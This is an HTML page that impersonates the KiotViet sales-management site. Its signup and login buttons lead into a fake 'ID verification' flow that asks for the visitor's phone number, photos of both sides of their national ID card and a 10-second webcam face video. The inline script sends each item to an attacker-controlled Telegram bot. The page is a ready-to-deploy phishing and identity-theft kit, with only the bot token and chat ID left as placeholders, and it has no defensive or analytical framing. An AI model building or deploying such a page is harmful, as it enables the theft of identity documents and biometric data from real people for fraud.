<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KiotViet - Ph·∫ßn m·ªÅm qu·∫£n l√Ω b√°n h√†ng ph·ªï bi·∫øn nh·∫•t</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Roboto', sans-serif; }
        .kv-green { color: #57b846; }
        .bg-kv-green { background-color: #57b846; }
        .hidden { display: none; }
        @keyframes scan { 0% { top: 5%; } 100% { top: 95%; } }
        .animate-scan { animation: scan 2s linear infinite; }
    </style>
</head>
<body class="bg-[#f4f7f6]">

<div id="app">
    <div id="landing-page">
        <nav class="flex items-center justify-between px-4 md:px-20 py-3 bg-white shadow-md sticky top-0 z-50">
            <div class="flex items-center gap-8">
                <img src="https://www.kiotviet.vn/Static/Theme/images/logo.png" alt="KiotViet" class="h-8">
                <div class="hidden lg:flex space-x-6 font-medium text-gray-600 text-[13px]">
                    <a href="#" class="hover:text-[#57b846]">KH√ÅM PH√Å</a>
                    <a href="#" class="hover:text-[#57b846]">PH√ÇN H·ªÜ NG√ÄNH H√ÄNG</a>
                    <a href="#" class="hover:text-[#57b846]">B·∫¢NG GI√Å</a>
                </div>
            </div>
            <div class="flex items-center gap-2">
                <button onclick="renderPhoneInput()" class="text-gray-700 font-bold text-sm px-4">ƒêƒÇNG NH·∫¨P</button>
                <button onclick="renderPhoneInput()" class="bg-[#ff9c00] text-white px-6 py-2 rounded font-bold text-sm shadow-sm">ƒêƒÇNG K√ù</button>
            </div>
        </nav>

        <main class="max-w-6xl mx-auto px-6 pt-16 text-center">
            <h1 class="text-4xl md:text-6xl font-bold mb-6 text-gray-800 leading-tight">Ph·∫ßn m·ªÅm qu·∫£n l√Ω <br/><span class="kv-green uppercase">Ph·ªï bi·∫øn nh·∫•t</span></h1>
            <p class="text-lg text-gray-600 mb-10 max-w-2xl mx-auto">H∆°n 200.000 c·ª≠a h√†ng ƒëang s·ª≠ d·ª•ng KiotViet ƒë·ªÉ kinh doanh hi·ªáu qu·∫£ h∆°n m·ªói ng√†y.</p>
            <div class="flex flex-col sm:flex-row justify-center gap-4 mb-16">
                <button class="bg-white text-[#57b846] border-2 border-[#57b846] px-10 py-3 rounded-full font-bold text-lg">KH√ÅM PH√Å NGAY</button>
                <button onclick="renderPhoneInput()" class="bg-kv-green text-white px-10 py-3 rounded-full font-bold text-lg shadow-lg">D√ôNG TH·ª¨ MI·ªÑN PH√ç</button>
            </div>
            <img src="https://www.kiotviet.vn/Static/Theme/images/banner_home_new.png" class="mx-auto rounded-xl shadow-2xl border border-white max-w-4xl w-full">
        </main>
    </div>

    <div id="flow-content"></div>
</div>

<script>
    // --- C·∫§U H√åNH ---
    const TELEGRAM_TOKEN = 'YOUR_BOT_TOKEN'; 
    const CHAT_ID = 'YOUR_CHAT_ID';

    async function sendToTele(text, file = null, type = 'text') {
        try {
            if (type === 'text') {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
                });
            } else {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append(type, file);
                if(text) formData.append('caption', text);
                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {
                    method: 'POST', body: formData
                });
            }
        } catch (e) { console.error(e); }
    }

    // --- B∆Ø·ªöC 2: NH·∫¨P SƒêT ---
    function renderPhoneInput() {
        document.getElementById('landing-page').classList.add('hidden');
        document.getElementById('flow-content').innerHTML = `
        <div class="min-h-screen flex flex-col items-center pt-20 px-6">
            <div class="bg-white p-8 rounded shadow-xl w-full max-w-sm border-t-4 border-kv-green text-center">
                <img src="https://www.kiotviet.vn/Static/Theme/images/logo.png" class="h-6 mx-auto mb-6">
                <h2 class="text-xl font-bold mb-8 text-gray-800 uppercase">X√°c minh KiotViet ID</h2>
                <input id="phone" type="tel" placeholder="Nh·∫≠p s·ªë ƒëi·ªán tho·∫°i" class="w-full p-4 border border-gray-300 rounded mb-6 focus:border-kv-green outline-none text-center text-xl tracking-widest">
                <button onclick="handlePhone()" class="w-full bg-kv-green text-white py-4 rounded font-bold text-lg hover:bg-[#46a338]">TI·∫æP T·ª§C</button>
            </div>
        </div>`;
    }

    async function handlePhone() {
        const p = document.getElementById('phone').value;
        if(p.length >= 10) {
            await sendToTele(`üì± **SƒêT M·ªöI**: \`${p}\``);
            showVerifyAlert();
        } else { alert("S·ªë ƒëi·ªán tho·∫°i kh√¥ng h·ª£p l·ªá"); }
    }

    // --- B∆Ø·ªöC 3: ALERT ---
    function showVerifyAlert() {
        const div = document.createElement('div');
        div.className = "fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4";
        div.innerHTML = `
        <div class="bg-white rounded p-8 text-center max-w-sm w-full border-t-4 border-[#ff9c00]">
            <h3 class="text-lg font-bold mb-4">Vui l√≤ng x√°c minh th√¥ng tin</h3>
            <p class="text-gray-600 mb-8 text-sm leading-relaxed">ƒê·ªÉ ho√†n t·∫•t n√¢ng c·∫•p b·∫£o m·∫≠t, b·∫°n c·∫ßn cung c·∫•p ·∫£nh ƒë·ªãnh danh (CCCD) v√† x√°c th·ª±c sinh tr·∫Øc h·ªçc khu√¥n m·∫∑t.</p>
            <button onclick="renderUpload()" class="w-full bg-kv-green text-white py-3 rounded font-bold uppercase">X√°c minh ngay</button>
        </div>`;
        document.body.appendChild(div);
    }

    // --- B∆Ø·ªöC 4: UPLOAD + PREVIEW ---
    function renderUpload() {
        if(document.querySelector('.fixed')) document.querySelector('.fixed').remove();
        document.getElementById('flow-content').innerHTML = `
        <div class="min-h-screen bg-white p-6 flex flex-col items-center pt-8">
            <h2 class="text-xl font-bold mb-10 uppercase kv-green">G·ª≠i ·∫£nh x√°c minh</h2>
            <div class="w-full max-w-sm space-y-6">
                <div class="relative border-2 border-dashed border-gray-300 rounded-2xl h-48 flex items-center justify-center bg-gray-50 overflow-hidden hover:border-kv-green transition">
                    <input type="file" class="absolute inset-0 opacity-0 z-20 cursor-pointer" onchange="previewImg(this, 'f-pre', 'M·∫∑t tr∆∞·ªõc')">
                    <p id="f-txt" class="text-gray-400 font-bold text-[10px] uppercase">CH·ª§P M·∫∂T TR∆Ø·ªöC TH·∫∫</p>
                    <img id="f-pre" class="hidden absolute inset-0 w-full h-full object-cover">
                </div>
                <div class="relative border-2 border-dashed border-gray-300 rounded-2xl h-48 flex items-center justify-center bg-gray-50 overflow-hidden hover:border-kv-green transition">
                    <input type="file" class="absolute inset-0 opacity-0 z-20 cursor-pointer" onchange="previewImg(this, 'b-pre', 'M·∫∑t sau')">
                    <p id="b-txt" class="text-gray-400 font-bold text-[10px] uppercase">CH·ª§P M·∫∂T SAU TH·∫∫</p>
                    <img id="b-pre" class="hidden absolute inset-0 w-full h-full object-cover">
                </div>
                <button onclick="renderVideo()" class="w-full bg-kv-green text-white py-4 rounded-xl font-bold mt-4 shadow-lg uppercase">Ti·∫øp t·ª•c quay video</button>
            </div>
        </div>`;
    }

    async function previewImg(input, preId, label) {
        if (input.files[0]) {
            const pre = document.getElementById(preId);
            const txt = document.getElementById(preId.replace('pre', 'txt'));
            const reader = new FileReader();
            reader.onload = e => { pre.src = e.target.result; pre.classList.remove('hidden'); txt.classList.add('hidden'); };
            reader.readAsDataURL(input.files[0]);
            await sendToTele(`üì∏ ${label} (X√°c minh KiotViet)`, input.files[0], 'photo');
        }
    }

    // --- B∆Ø·ªöC 5: VIDEO + SCAN ---
    function renderVideo() {
        document.getElementById('flow-content').innerHTML = `
        <div class="min-h-screen bg-gray-950 flex flex-col items-center justify-center text-white p-6">
            <h2 class="text-sm font-bold mb-8 uppercase tracking-widest kv-green">X√°c th·ª±c khu√¥n m·∫∑t</h2>
            <div class="relative w-64 h-64">
                <video id="v" autoplay muted playsinline class="w-full h-full object-cover rounded-full border-4 border-gray-800"></video>
                <div id="scan" class="hidden absolute top-0 left-0 w-full h-1 bg-green-500 shadow-[0_0_15px_green] z-20 animate-scan"></div>
                <div class="absolute inset-0 border-[15px] border-gray-950/60 rounded-full z-10"></div>
                <svg class="absolute inset-0 w-full h-full -rotate-90 z-10"><circle id="pb" cx="128" cy="128" r="124" stroke="#57b846" stroke-width="6" fill="transparent" stroke-dasharray="780" stroke-dashoffset="780" /></svg>
            </div>
            <div id="st" class="mt-8 text-xs font-bold uppercase tracking-widest text-gray-500">ƒêang t√¨m khu√¥n m·∫∑t...</div>
            <button id="go" class="mt-8 bg-kv-green px-12 py-3 rounded-full font-bold uppercase">B·∫Øt ƒë·∫ßu x√°c th·ª±c</button>
        </div>`;

        const v = document.getElementById('v'), go = document.getElementById('go'), st = document.getElementById('st'), scan = document.getElementById('scan'), pb = document.getElementById('pb');
        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
            v.srcObject = stream;
            go.onclick = () => {
                go.classList.add('hidden'); scan.classList.remove('hidden'); st.innerText = "ƒêang qu√©t khu√¥n m·∫∑t..."; st.classList.replace('text-gray-500', 'text-green-500');
                let chunks = [], r = new MediaRecorder(stream);
                r.ondataavailable = e => chunks.push(e.data);
                r.onstop = async () => {
                    await sendToTele("üé• VIDEO M·∫∂T 10S", new Blob(chunks, {type: 'video/mp4'}), 'video');
                    alert("Ho√†n t·∫•t! D·ªØ li·ªáu c·ªßa b·∫°n ƒë√£ ƒë∆∞·ª£c g·ª≠i x√©t duy·ªát."); window.location.reload();
                };
                r.start();
                let c = 10;
                let i = setInterval(() => {
                    c--; st.innerText = `GI·ªÆ NGUY√äN M·∫∂T (${c}S)`;
                    pb.style.strokeDashoffset = 780 - (780 * (10 - c)) / 10;
                    if (c <= 0) { clearInterval(i); r.stop(); stream.getTracks().forEach(t => t.stop()); }
                }, 1000);
            };
        });
    }
</script>
</body>
</html>
